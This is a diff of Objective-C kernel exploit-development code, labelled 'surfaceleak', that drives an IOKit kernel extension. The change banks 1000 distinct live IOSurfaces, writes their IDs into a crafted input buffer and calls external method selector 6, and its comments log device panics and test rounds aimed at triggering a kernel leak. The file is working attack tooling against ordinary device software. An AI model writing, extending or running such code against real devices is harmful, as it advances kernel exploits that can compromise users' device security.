@@ -32,7 +32,7 @@
 #import "LabLocalTime.h"
 #import "LabRuntimeOffsets.h"
 
-#define P114_BUILD @"p114-surfaceleak-v1.10-contractv5"
+#define P114_BUILD @"p114-surfaceleak-v1.11-sidbank"
 
 #import <Foundation/Foundation.h>
 #import <CoreFoundation/CoreFoundation.h>
@@ -257,35 +257,52 @@ static void p114_hexdump(size_t maxn) {
              current_task check; "IOCoreSurfaceRoot"). Kernel-assigned
              values from creating real surfaces in-process; zeros = NULL ->
              2c2 (all of tonight's runs), foreign sids = the "failed global"
-             panic ladder. v5's repetition note: one valid SID in all 1000
-             slots appears structurally permitted (erase-then-recreate per
-             iteration) — the single-sid fill is this build; the honest note
-             is that repetition needs this device test to confirm.
-           - in[0xFA4] bit0 = 1 (byte-verified both builds, note 274).
-           Device evidence this explains: every zeros/count2/tag0 run = 2c2
-           exactly at the phase0/sid-law, and panic-note-275's spill table
-           sids = staging-class surface SIDs (the same SID universe). */
-        p114_SurfaceRef qs = p114_mk_surface();   /* the one owned surface   */
-        uint32_t qs_sid = 0;
-        if (g_p114_surfID) qs_sid = g_p114_surfID((void *)qs);
-        if (!qs || !qs_sid) {
-            Lf(@"[-] QueueCreate HOLD (no-guess law): IOSurfaceCreate/GetID "
-               @"unavailable — cannot build the v5 tags contract; honest stop.");
-            if (qs && g_p114_surfRel) g_p114_surfRel(qs);
+             panic ladder.
+             v1.11 FALSIFICATION (the 12:08 device round): single-sid
+             repetition in all 1000 slots -> 2c2 — the SID lookup wants
+             DISTINCT live surfaces (the repetition note is falsified on
+             the real kext). This build banks up to 1000 DISTINCT tiny
+             real surfaces (16x1, far under the per-UC 0x4000 limit law),
+             each holds its own slot; every surface stays ALIVE through
+             the call (the mismatched-sid PANIC law) and is released
+             after (the kext holds its own refs).
+           - in[0xFA4] bit0 = 1 (byte-verified both builds, note 274). */
+        static uint32_t p114_sids[1000];
+        static p114_SurfaceRef p114_bank[1000];
+        int nbank = 0;
+        memset(p114_sids, 0, sizeof(p114_sids));
+        memset(p114_bank, 0, sizeof(p114_bank));
+        while (nbank < 1000) {
+            p114_SurfaceRef s = p114_mk_surface();
+            if (!s) break;
+            uint32_t sid = g_p114_surfID ? g_p114_surfID((void *)s) : 0;
+            if (!sid) { if (g_p114_surfRel) g_p114_surfRel(s); continue; }
+            p114_bank[nbank] = s;
+            p114_sids[nbank] = sid;
+            nbank++;
+        }
+        if (nbank < 1000) {
+            Lf(@"[-] QueueCreate HOLD (no-guess law): bank=%d distinct live "
+               @"surfaces < 1000 — not sending an incomplete tags contract; "
+               @"honest stop (surfaces released).", nbank);
+            for (int i = 0; i < nbank && p114_bank[i]; i++)
+                if (g_p114_surfRel) g_p114_surfRel(p114_bank[i]);
             goto v5_stop;
         }
+        Lf(@"[*] v5 contract: word0=0x3e8; %d DISTINCT sids banked "
+           @"(sid[0]=0x%08x .. sid[%d]=0x%08x) + in[0xFA4]=1",
+           nbank, p114_sids[0], nbank - 1, p114_sids[nbank - 1]);
         *(uint32_t *)(void *)qBuf = 0x3e8;              /* word0 = 1000      */
         for (int ti = 0; ti < 1000; ti++)
-            *(uint32_t *)(void *)(qBuf + 4 + ti * 4) = qs_sid;  /* tags[i]   */
+            *(uint32_t *)(void *)(qBuf + 4 + ti * 4) = p114_sids[ti];  /* tags[i] */
         qBuf[0xFA4] = 0x01;                             /* the flag word bit0 */
-        Lf(@"[*] v5 contract: word0=0x3e8 (1000 tags of sid=0x%08x) + in[0xFA4]=1",
-           qs_sid);
         size_t qOutLen = sizeof(qBuf);
         uint64_t qOut[4] = {0};
         kern_return_t krQ = g_p114_callStruct(g_p114_conn, 6, qBuf, qsz, qOut, &qOutLen);
         g_p114_qh = qOut[0];
         g_p114_queued = YES;
-        if (qs && g_p114_surfRel) g_p114_surfRel(qs);   /* the kext holds its own refs */
+        for (int i = 0; i < nbank && p114_bank[i]; i++)
+            if (g_p114_surfRel) g_p114_surfRel(p114_bank[i]);   /* the kext holds its own refs */
         Lf(@"[*] QueueCreate sel=6 stIn=0x%x (v5 contract: {1000, sids[1000], flags}) "
            @"kr=0x%x outLen=%zu out0=%016llx (the {u64} input candidate)",
            qsz, krQ, qOutLen, (unsigned long long)qOut[0]);
